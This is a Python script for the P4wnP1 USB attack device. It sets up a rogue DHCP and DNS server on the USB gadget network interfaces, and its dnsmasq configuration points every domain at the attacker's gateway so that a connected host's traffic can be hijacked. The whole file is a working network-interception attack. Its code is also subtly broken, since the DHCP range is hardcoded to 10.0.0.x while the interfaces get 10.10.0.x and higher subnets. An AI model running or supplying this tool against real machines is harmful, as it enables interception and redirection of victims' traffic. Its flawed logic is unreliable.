#!/usr/bin/env python3
import subprocess, shlex, sys

P4WNCTL = "/opt/p4wnp1/p4wnctl.py"

def sh(cmd):
    return subprocess.check_output(cmd, shell=True, text=True).strip()

def gadget_ifaces():
    try:
        out = sh(f"{shlex.quote(P4WNCTL)} gadget-ifaces")
        return [l.strip() for l in out.splitlines() if l.strip()]
    except Exception:
        return []

def up_iface(iface, cidr="10.0.0.1/24"):
    subprocess.run(["ip","link","set",iface,"up"], check=True)
    subprocess.run(["ip","addr","flush","dev",iface], check=False)
    subprocess.run(["ip","addr","add",cidr,"dev",iface], check=True)

def run_dnsmasq(iface, gw="10.0.0.1"):
    conf = f"""
interface={iface}
bind-interfaces
dhcp-range=10.0.0.50,10.0.0.150,12h
dhcp-option=3,{gw}
dhcp-option=6,{gw}
address=/#/{gw}
log-queries
"""
    tmp = f"/run/dnsmasq-{iface}.conf"
    open(tmp,"w").write(conf)
    subprocess.Popen(["dnsmasq","--keep-in-foreground","--conf-file="+tmp])

def main():
    ifaces = gadget_ifaces()
    if not ifaces:
        print("[!] No USB gadget network interface present (host likely has no driver). Exiting.")
        sys.exit(0)
    for idx,iface in enumerate(ifaces):
        # vary subnets if multiple gadget NICs exist
        oct = 10 + idx
        cidr = f"10.{oct}.0.1/24"
        gw   = f"10.{oct}.0.1"
        up_iface(iface, cidr)
        run_dnsmasq(iface, gw)
    print(f"[+] Rogue DHCP/DNS running on: {', '.join(ifaces)}")

if __name__ == "__main__":
    main()
